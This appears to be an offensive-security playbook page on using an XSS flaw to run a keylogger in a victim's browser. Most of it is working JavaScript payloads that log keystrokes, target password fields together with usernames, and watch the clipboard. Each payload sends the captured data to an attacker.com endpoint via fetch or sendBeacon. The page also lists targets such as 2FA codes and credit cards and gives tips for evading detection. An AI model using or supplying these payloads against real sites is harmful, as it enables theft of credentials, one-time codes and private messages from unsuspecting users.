# XSS — Keylogging

## When this applies

The XSS sink lives in a long-lived page (dashboard, in-app chat, comment thread under a post the victim revisits). Capturing every keystroke surfaces credentials, 2FA codes, search queries, and message contents that are not visible in static page state.

## Technique

Attach a `keydown` / `keypress` / `input` event listener to `document`. Buffer keystrokes locally, batch-send via `fetch` or `navigator.sendBeacon` to avoid losing data on page unload. Optionally enrich with target metadata (URL, element, modifiers).

## Steps

### Basic Keylogger

**Simple Implementation**:
```javascript
<script>
var keys = '';
document.onkeypress = function(e) {
    keys += e.key;

    // Send every 50 characters to avoid data loss
    if(keys.length > 50) {
        fetch('https://attacker.com/keylog', {
            method: 'POST',
            mode: 'no-cors',
            body: keys
        });
        keys = '';
    }
};

// Send remaining keys on page unload
window.onbeforeunload = function() {
    if(keys.length > 0) {
        navigator.sendBeacon('https://attacker.com/keylog', keys);
    }
};
</script>
```

### Enhanced Keylogger with Context

**Comprehensive Logging**:
```javascript
<script>
var log = [];

// Capture all key events
document.addEventListener('keydown', function(e) {
    log.push({
        key: e.key,
        code: e.code,
        time: Date.now(),
        url: location.href,
        element: e.target.tagName,
        elementId: e.target.id,
        elementName: e.target.name,
        shift: e.shiftKey,
        ctrl: e.ctrlKey,
        alt: e.altKey,
        meta: e.metaKey
    });

    // Batch send every 20 keys
    if(log.length > 20) {
        sendLog();
    }
});

function sendLog() {
    if(log.length > 0) {
        navigator.sendBeacon('https://attacker.com/keylog', JSON.stringify(log));
        log = [];
    }
}

// Send on focus loss
window.addEventListener('blur', sendLog);

// Send on page unload
window.addEventListener('beforeunload', sendLog);

// Periodic backup send every 30 seconds
setInterval(sendLog, 30000);
</script>
```

### Password Field Detection

**Targeted Password Capture**:
```javascript
<script>
document.addEventListener('input', function(e) {
    // Detect password fields
    if(e.target.type === 'password' ||
       e.target.name.toLowerCase().includes('pass') ||
       e.target.id.toLowerCase().includes('pass')) {

        // Find associated username field
        var form = e.target.form;
        var username = '';

        if(form) {
            var userFields = form.querySelectorAll('[name*="user"], [name*="email"], [type="email"]');
            if(userFields.length > 0) {
                username = userFields[0].value;
            }
        }

        // Exfiltrate credentials
        fetch('https://attacker.com/creds', {
            method: 'POST',
            mode: 'no-cors',
            body: JSON.stringify({
                username: username,
                password: e.target.value,
                url: location.href,
                time: new Date().toISOString()
            })
        });
    }
});
</script>
```

### Clipboard Monitoring

**Capture Copy/Paste Actions**:
```javascript
<script>
// Monitor clipboard copy
document.addEventListener('copy', function(e) {
    var selection = window.getSelection().toString();
    fetch('https://attacker.com/clipboard', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            action: 'copy',
            content: selection,
            url: location.href
        })
    });
});

// Monitor clipboard paste
document.addEventListener('paste', function(e) {
    var pasted = (e.clipboardData || window.clipboardData).getData('text');
    fetch('https://attacker.com/clipboard', {
        method: 'POST',
        mode: 'no-cors',
        body: JSON.stringify({
            action: 'paste',
            content: pasted,
            url: location.href
        })
    });
});
</script>
```

### Common Use Cases

1. **Credential Harvesting**: Capture login attempts
2. **Sensitive Data**: Monitor input of credit cards, SSNs
3. **Session Persistence**: Long-term monitoring
4. **Two-Factor Codes**: Capture OTP/2FA tokens
5. **Private Messages**: Monitor chat/email composition

## Verifying success

- Attacker endpoint receives keystroke batches at expected cadence (every 20–50 keys, or every 30s).
- `beforeunload` flush delivers the trailing buffer when victim leaves the page.
- For password capture: typed password matches what victim entered (verify by logging in to victim's account if authorized).

## Common pitfalls

1. **No batching** — sending every keystroke spams the network and may trigger WAF / rate-limit detection.
2. **No `beforeunload` flush** — last partial buffer is lost when victim navigates away.
3. **Using `fetch` on unload** — many browsers cancel in-flight `fetch` on unload; use `navigator.sendBeacon` instead.
4. **Listening on a single element** — handler attached to `<input>` misses keystrokes on other fields; attach to `document` for full coverage.
5. **`keypress` deprecated** — modern handlers should use `keydown` (captures non-printable keys like Tab, Enter).

## Tools

- **`navigator.sendBeacon`** — reliable unload-time exfiltration
- **Burp Collaborator** — receiving endpoint with built-in inspection
- **netcat / Python `http.server`** — quick attacker-side listener for testing
- **DevTools → Network → keylog** — verify batches arrive in your local PoC before delivery
